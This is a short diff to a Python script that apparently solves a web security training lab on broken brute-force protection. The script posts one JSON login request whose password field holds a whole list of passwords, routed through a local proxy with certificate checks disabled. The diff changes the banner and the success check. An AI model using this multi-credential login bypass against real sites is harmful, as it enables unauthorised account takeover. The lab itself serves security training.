@@ -10,6 +10,7 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 
 def main():
+    print('[+] Lab: Broken brute-force protection, multiple credentials per request')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -27,7 +28,7 @@ def main():
             "password": passwords,
             "": ""}
     r = requests.post(f'{host}/login', json=json, verify=False, allow_redirects=True, proxies=proxies)
-    if "Congratulations, you solved the lab!" in r.text:
+    if 'Your username is: carlos' in r.text:
         print(f'[+] Login successful, lab solved')
     else:
         print(f'[-] Login not successful')
